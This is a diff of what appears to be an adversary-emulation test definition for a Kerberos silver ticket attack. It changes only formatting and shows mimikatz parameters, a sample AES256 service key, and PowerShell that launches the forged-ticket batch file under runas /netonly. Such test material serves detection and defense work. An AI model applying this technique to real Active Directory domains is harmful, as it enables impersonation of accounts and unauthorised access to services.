@@ -7,31 +7,31 @@ atomic_tests:
     Once the hash of service account is retrieved it is possible to forge Kerberos ticket granting service (TGS) tickets, also known as silver tickets.
     The generated ticket is injected in a new empty Windows session and discarded after, so it does not pollute the current Windows session.
   supported_platforms:
-    - windows
+  - windows
   input_arguments:
     domain_sid:
       description: SID of the targeted domain, if you keep default it will automatically get the current domain SID
-      type: String
+      type: string
       default: S-1-5-21-DEFAULT
     domain:
       description: Targeted Active Directory domain FQDN
-      type: String
+      type: string
       default: '%userdnsdomain%'
     account:
       description: Account to impersonate
-      type: String
+      type: string
       default: silverticketfakeuser
     target:
       description: System you want to target (Default will be logon server)
-      type: String
+      type: string
       default: '%logonserver:\\=%'
     service_aes256_key:
       description: AES256 key (you will need to set to match your service key for your target)
-      type: String
+      type: string
       default: b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9
     mimikatz_path:
       description: Mimikatz windows executable
-      type: Path
+      type: path
       default: '$env:TEMP\mimikatz\x64\mimikatz.exe'
   dependency_executor_name: powershell
   dependencies:
@@ -85,10 +85,10 @@ atomic_tests:
         echo End of Silver Ticket attack
       )
       "@ -Replace "DOMAIN_SID", $domain_sid | Out-File -Encoding OEM $env:TEMP\silver.bat
-      
+
       # run batch file in a new empty session (password and username do not matter)
       echo "foo" | runas /netonly /user:fake "$env:TEMP\silver.bat" | Out-Null
-      
+
       # wait until the output file has logged the entire attack
       do {
         Start-Sleep 1 # wait a bit so the output file has time to be created
